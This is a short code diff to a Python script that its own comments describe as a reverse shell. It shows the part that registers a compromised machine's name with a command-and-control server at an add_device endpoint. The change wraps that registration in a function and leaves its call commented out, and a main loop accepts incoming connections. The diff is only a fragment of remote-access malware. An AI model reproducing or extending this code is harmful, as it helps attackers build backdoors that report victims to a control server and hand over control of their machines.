@@ -28,14 +28,15 @@ c2_ip = '0.0.0.0'
 c2_port = '8000'
 add_device_url = f'http://{c2_ip}:{c2_port}/add_device/'
 
-try:
-    response = requests.post(add_device_url, data={'name':system_name,'ip_address':''})
-    if response.status_code == 200:
-        print("Form submitted successfully.")
-    else:
-        print(f"Form submission failed with status code: {response.status_code}")
-except requests.exceptions.RequestException as e:
-    print(f"Error submitting form: {e}")
+def add_device():
+    try:
+        response = requests.post(add_device_url, data={'name':system_name,'ip_address':''})
+        if response.status_code == 200:
+            print("Form submitted successfully.")
+        else:
+            print(f"Form submission failed with status code: {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"Error submitting form: {e}")
 
 # Device added...
 
@@ -142,6 +143,9 @@ def check_ftp_capabilities(hostname):
 # Entry point of the reverse shell
 
 if __name__ == '__main__':
+
+    # Submitting Device Name and IP to the C2 server.
+    # add_device()
 
     while True:
         conn, addr = s.accept()
